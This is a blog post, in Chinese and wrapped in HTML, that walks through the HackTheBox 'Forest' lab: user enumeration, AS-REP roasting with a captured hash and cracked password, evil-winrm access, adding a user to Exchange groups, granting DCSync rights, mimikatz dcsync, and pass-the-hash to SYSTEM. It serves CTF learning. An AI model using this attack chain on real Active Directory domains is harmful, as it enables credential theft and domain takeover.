@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fre4k5en.com","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.8.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="Gathering information12Nmap -sC -sV -p- forest.htb   53端口开放了DNS服务，445端口开放了SMB服务，5985端口windows远程管理服务，域名为htb.local">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Forest">
+<meta property="og:url" content="https://fre4k5en.com/2021/11/04/HackTheBox-Forest/index.html">
+<meta property="og:site_name" content="最后的家">
+<meta property="og:description" content="Gathering information12Nmap -sC -sV -p- forest.htb   53端口开放了DNS服务，445端口开放了SMB服务，5985端口windows远程管理服务，域名为htb.local">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnitjnp35j31350u0aln.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnh33emnmj30yw0lkn0k.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnh5vltvvj30q005igm3.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnhk97nb2j30m60tcafg.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnho2vfltj30fk0a0q3k.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glni8m2oepj31ow0dg0wp.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glniflrc08j31kw07ytam.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnimjmcnhj324g0rotes.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwgy1gloobhb2f7j31c80sq79o.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwgy1gloo8rxpg6j30u00vfn15.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwgy1glp1ccxl5zj30u00ur7dh.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwgy1glp0semdr6j30xg0u07n1.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwgy1glp0vavsvaj30zy0gwgp6.jpg">
+<meta property="article:published_time" content="2021-11-04T08:21:21.000Z">
+<meta property="article:modified_time" content="2021-11-04T09:38:10.878Z">
+<meta property="article:author" content="Fre4k5en">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnitjnp35j31350u0aln.jpg">
+
+
+<link rel="canonical" href="https://fre4k5en.com/2021/11/04/HackTheBox-Forest/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fre4k5en.com/2021/11/04/HackTheBox-Forest/","path":"2021/11/04/HackTheBox-Forest/","title":"HackTheBox-Forest"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HackTheBox-Forest | 最后的家</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">最后的家</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Fre4k5en's Shelter</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Gathering-information"><span class="nav-text">Gathering information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E4%BD%8E%E6%9D%83%E9%99%90%E8%B4%A6%E6%88%B7%E5%87%AD%E8%AF%81"><span class="nav-text">爆破低权限账户凭证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90"><span class="nav-text">获取系统权限</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%B0%E5%BB%BA%E8%B4%A6%E6%88%B75en%EF%BC%8C%E5%B0%86svc-alfresco%E5%8A%A0%E5%85%A5exchange%E7%BB%84"><span class="nav-text">新建账户5en，将svc-alfresco加入exchange组</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B5%8B%E4%BA%885en%E8%B4%A6%E6%88%B7DCSync%E6%9D%83%E9%99%90"><span class="nav-text">赋予5en账户DCSync权限</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Fre4k5en"
+      src="https://cdn.jsdelivr.net/gh/Fre4k5en/BlogAssets/logo.jpeg">
+  <p class="site-author-name" itemprop="name">Fre4k5en</p>
+  <div class="site-description" itemprop="description">我的朋友好像都是网上的那些人，现实中不爱理人也没有人理我。有一天妈妈突然问我，万一有一天网络消失了，你该怎么办？那一刻我如醍醐灌顶，想通了很多事情。原来我人生中最重要的使命，就是保护互联网，不让它消失。</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/fre4k5en" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;fre4k5en" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:fre4k5en@gmail.com" title="E-Mail → mailto:fre4k5en@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fre4k5en.com/2021/11/04/HackTheBox-Forest/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/Fre4k5en/BlogAssets/logo.jpeg">
+      <meta itemprop="name" content="Fre4k5en">
+      <meta itemprop="description" content="我的朋友好像都是网上的那些人，现实中不爱理人也没有人理我。有一天妈妈突然问我，万一有一天网络消失了，你该怎么办？那一刻我如醍醐灌顶，想通了很多事情。原来我人生中最重要的使命，就是保护互联网，不让它消失。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="最后的家">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HackTheBox-Forest
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-11-04 16:21:21 / Modified: 17:38:10" itemprop="dateCreated datePublished" datetime="2021-11-04T16:21:21+08:00">2021-11-04</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a>Gathering information</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Nmap -<span class="keyword">sC</span> -sV -p- <span class="keyword">forest</span>.htb</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1glnitjnp35j31350u0aln.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnitjnp35j31350u0aln.jpg" alt="image-20201214173846004"></a></p>
+<p>53端口开放了DNS服务，445端口开放了SMB服务，5985端口windows远程管理服务，域名为htb.local</p>
+<span id="more"></span>
+
+<p>查看域名解析记录</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">dig</span> @<span class="number">10.129.1.77</span> forest.htb</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1glnh33emnmj30yw0lkn0k.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnh33emnmj30yw0lkn0k.jpg" alt="image-20201214163839196"></a></p>
+<p>查看SMB共享，这里允许匿名登录但是没有共享内容</p>
+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">smbclient -<span class="built_in">N</span> -L forest.htb</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1glnh5vltvvj30q005igm3.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnh5vltvvj30q005igm3.jpg" alt="image-20201214164125854"></a></p>
+<p>RPC(Remote Procedure Call，远程过程调用)，用于不同服务器之间调用方法，RPC框架把不同的调用方法封装起来，可以使得调用远程方法像调用本地方法一样简单</p>
+<p>利用Samba套件下的rpcclient查看rpc服务，匿名登录</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># rpcclient forest.htb -U%</span></span><br><span class="line">rpcclient <span class="variable">$&gt;</span> enumdomusers</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1glnhk97nb2j30m60tcafg.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnhk97nb2j30m60tcafg.jpg" alt="image-20201214165513974"></a></p>
+<p>爆出了很多用户名，我们把SM_<em>和Health</em>去掉，整理一下得到以下用户</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1glnho2vfltj30fk0a0q3k.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnho2vfltj30fk0a0q3k.jpg" alt="image-20201214165855239"></a></p>
+<h3 id="爆破低权限账户凭证"><a href="#爆破低权限账户凭证" class="headerlink" title="爆破低权限账户凭证"></a>爆破低权限账户凭证</h3><p>Kerberos安全框架通常需要密码验证，但是存在选项“Do not require Kerberos preauthentication” 或 UF_DONT_REQUIRE_PREAUTH，如果被设置为true，则不需要Kerberos预身份验证就可导出密码</p>
+<p>利用impacket套件中的GetNPUsers.py脚本</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1glni8m2oepj31ow0dg0wp.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glni8m2oepj31ow0dg0wp.jpg" alt="image-20201214171839320"></a></p>
+<p>可以获取到用户svc-alfresco的加密密码</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$krb<span class="number">5</span>asrep$svc-alfresco<span class="title">@HTB.LOCAL</span>:ce<span class="number">4</span>fa<span class="number">143712</span>d<span class="number">710440</span>cd<span class="number">0e93</span>b<span class="number">77542</span><span class="keyword">c</span><span class="number">1</span>$<span class="number">41595</span><span class="keyword">c</span><span class="number">658e3</span><span class="keyword">c</span><span class="number">839195</span>f<span class="number">999</span>dad<span class="number">62</span><span class="keyword">c</span><span class="number">36</span><span class="keyword">c</span><span class="number">80</span>d<span class="number">1</span>db<span class="number">8892</span>f<span class="number">41</span>d<span class="number">8</span>f<span class="number">497797</span><span class="keyword">c</span><span class="number">24</span>ebe<span class="number">60</span>f<span class="number">39</span>a<span class="number">7</span>d<span class="number">316133</span>f<span class="number">18539</span>f<span class="number">6</span>bb<span class="number">4</span>ccd<span class="number">0</span>cfc<span class="number">81</span>f<span class="number">610</span><span class="keyword">c</span><span class="number">61</span>ec<span class="number">51</span>b<span class="number">8e1</span>f<span class="number">6</span>b<span class="number">5050</span>a<span class="number">72e78267</span>ab<span class="number">18</span>fd<span class="number">18</span>ef<span class="number">93</span>f<span class="number">456</span>dddf<span class="number">6</span>ec<span class="number">9997</span>a<span class="number">69</span>f<span class="number">3</span>b<span class="number">331e84377</span>f<span class="number">4e04777</span>e<span class="number">9</span>d<span class="number">5948</span>ffa<span class="number">823953</span>aa<span class="number">58</span>d<span class="number">3</span>ab<span class="number">72</span>b<span class="number">52</span>ea<span class="number">76</span><span class="keyword">c</span><span class="number">1377</span><span class="keyword">c</span><span class="number">750264</span>d<span class="number">19</span>a<span class="number">8988</span>d<span class="number">219576</span><span class="keyword">c</span><span class="number">8</span>a<span class="number">5797</span>fc<span class="number">5</span>cb<span class="number">437</span>a<span class="number">588</span>a<span class="number">4764e65993</span>a<span class="number">07</span><span class="keyword">c</span><span class="number">61</span>cafddaddca<span class="number">9</span>bf<span class="number">627e3396</span>f<span class="number">193</span><span class="keyword">c</span><span class="number">3</span>aba<span class="number">1323</span>aeafc<span class="number">1</span>a<span class="number">25845056e133</span>a<span class="number">5e3</span>b<span class="number">7</span>f<span class="number">488</span>ed<span class="number">5</span>cf<span class="number">3e4</span>b<span class="number">26</span>faa<span class="number">60</span>cf<span class="number">42e99</span>f<span class="number">86</span>bded<span class="number">9</span>a<span class="number">3e5</span>bbb<span class="number">1</span>d<span class="number">1</span>a<span class="number">818</span>f<span class="number">1022586426</span>aba<span class="number">76e04</span>e<span class="number">0</span>b<span class="number">04</span><span class="keyword">c</span><span class="number">5</span><span class="keyword">c</span><span class="number">04e4</span>da<span class="number">05</span>d<span class="number">1</span>af<span class="number">3</span>ef<span class="number">85</span>d<span class="number">85</span>a<span class="number">1</span><span class="keyword">c</span><span class="number">4</span>d<span class="number">2</span>ae<span class="number">9</span>b<span class="number">501</span><span class="keyword">c</span><span class="number">5026</span>ac<span class="number">8900</span>ed<span class="number">105</span>ddd<span class="number">0e8</span></span><br></pre></td></tr></table></figure>
+
+<p>上JohnTheRipper或者hashcat，采用kali自带的rockyou字典</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1glniflrc08j31kw07ytam.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glniflrc08j31kw07ytam.jpg" alt="image-20201214172522067"></a></p>
+<p>密码为s3rvice</p>
+<p>下载安装evil-winrm，通过5985端口连接服务器</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">gem</span> install evil-winrm</span><br><span class="line"></span><br><span class="line"><span class="attribute">evil</span>-winrm -i <span class="number">10.129.1.77</span> -u svc-alfresco -p s<span class="number">3</span>rvice -P <span class="number">5985</span> </span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1glnimjmcnhj324g0rotes.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnimjmcnhj324g0rotes.jpg" alt="image-20201214173202854"></a></p>
+<p>得到svc-alfresco账户权限</p>
+<h3 id="获取系统权限"><a href="#获取系统权限" class="headerlink" title="获取系统权限"></a>获取系统权限</h3><p>将我们准备好的sharphound.exe上传并收集信息，再将结果下载到hound环境，选择Find Shortest Paths to Domain Admins（寻找到域管理员的最短路径）</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:<span class="symbol">\U</span>sers<span class="symbol">\s</span>vc-alfresco<span class="symbol">\D</span>ocuments&gt; upload /root/SharpHound.exe</span><br><span class="line">*Evil-WinRM* PS C:<span class="symbol">\U</span>sers<span class="symbol">\s</span>vc-alfresco<span class="symbol">\D</span>ocuments&gt; ./SharpHound.exe -c all</span><br><span class="line">*Evil-WinRM* PS C:<span class="symbol">\U</span>sers<span class="symbol">\s</span>vc-alfresco<span class="symbol">\D</span>ocuments&gt; download xxx.zip</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwgy1gloobhb2f7j31c80sq79o.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1gloobhb2f7j31c80sq79o.jpg" alt="image-20201215173431845"></a></p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwgy1gloo8rxpg6j30u00vfn15.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1gloo8rxpg6j30u00vfn15.jpg" alt="image-20201215173150914"></a></p>
+<p>可以看到我们是exchange组的成员，而exchange组对htb.local有一个叫做WriteDacL的权限，通过初步学习得知，通过writedacl权限，我们可以使用dcsync:mimikatz从krbtgt账户的hash制作Golden TIcket（黄金票据），登录域控。而Exchage Trusted Subsystem（exchage信任的子系统）也有这个权限，控制这个子系统的是account operatiors（账户操作员），而我们正是这个组的成员。</p>
+<h5 id="新建账户5en，将svc-alfresco加入exchange组"><a href="#新建账户5en，将svc-alfresco加入exchange组" class="headerlink" title="新建账户5en，将svc-alfresco加入exchange组"></a>新建账户5en，将svc-alfresco加入exchange组</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net<span class="built_in"> user </span>账户 密码 /<span class="builtin-name">add</span> /domain</span><br><span class="line"></span><br><span class="line">Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net<span class="built_in"> group </span><span class="string">&quot;Exchange Windows Permissions&quot;</span> svc-alfresco /<span class="builtin-name">add</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net<span class="built_in"> group </span><span class="string">&quot;Exchange Trusted Subsystem&quot;</span> svc-alfresco /<span class="builtin-name">add</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net localgroup &quot;Remote Management Users&quot; svc-alfresco /add</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="赋予5en账户DCSync权限"><a href="#赋予5en账户DCSync权限" class="headerlink" title="赋予5en账户DCSync权限"></a>赋予5en账户DCSync权限</h5><p>hound中自带了WriteDacL的help，里面有利用方式</p>
+<blockquote>
+<p>To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges.</p>
+<p>–要对域对象使用WriteDacl，你需要赋予自己DcSync权限</p>
+<p>You may need to authenticate to the Domain Controller as a member of EXCHANGE WINDOWS <a href="mailto:PERMISSIONS@HTB.LOCAL">PERMISSIONS@HTB.LOCAL</a> if you are not running a process as a member. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):</p>
+<p>–如果你不是EXCHANGE WINDOWS <a href="mailto:PERMISSIONS@HTB.LOCAL">PERMISSIONS@HTB.LOCAL</a>对成员，你需要以它的成员的身份获取域控的凭证。结合Add-DomainObjectAcl功能，首先创建一个PS凭证对象（这些例子来自PowerView 帮助手册）</p>
+<p>$SecPassword = ConvertTo-SecureString ‘Password123!’ -As -Force<br>$Cred = New-Object System.Management.Automation.PSCredential(‘TESTLAB\dfm.a’, $SecPassword)</p>
+<p>Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as EXCHANGE WINDOWS <a href="mailto:PERMISSIONS@HTB.LOCAL">PERMISSIONS@HTB.LOCAL</a>:</p>
+<p>–然后，使用Add-DomainObjectAcl，如果你没有在EXCHANGE WINDOWS <a href="mailto:PERMISSIONS@HTB.LOCAL">PERMISSIONS@HTB.LOCAL</a>中，可以选择具体的$Cred</p>
+<p>Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync</p>
+<p>Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain</p>
+<p>–一旦你有了DCSync权限，你可以使用mimikatz dcsync功能获取域内任意账号的密码</p>
+<p>lsadump::dcsync /domain:testlab.local /user:Administrator</p>
+<p>Cleanup can be done using the Remove-DomainObjectAcl function:<br>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync</p>
+<p>在使用Remove-DomainObjectAcl 方法后可以做清理</p>
+</blockquote>
+<p>–后为笔者三流英语译文</p>
+<p>按照hound中的流程走一遍</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwgy1glp1ccxl5zj30u00ur7dh.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glp1ccxl5zj30u00ur7dh.jpg" alt="image-20201216010512209"></a></p>
+<p>使用secretdump.py通过5en账户导出administrator的密码hash</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwgy1glp0semdr6j30xg0u07n1.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glp0semdr6j30xg0u07n1.jpg" alt="image-20201216004600962"></a></p>
+<p>psexec.py 通过hash连接目标administrator账户</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwgy1glp0vavsvaj30zy0gwgp6.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glp0vavsvaj30zy0gwgp6.jpg" alt="image-20201216004848556"></a></p>
+<p>获取系统权限</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/11/04/HackTheBox-Laboratory/" rel="prev" title="HackTheBox-Laboratory">
+                  <i class="fa fa-chevron-left"></i> HackTheBox-Laboratory
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/11/04/HackTheBox-Postman/" rel="next" title="HackTheBox-Postman">
+                  HackTheBox-Postman <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Fre4k5en</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
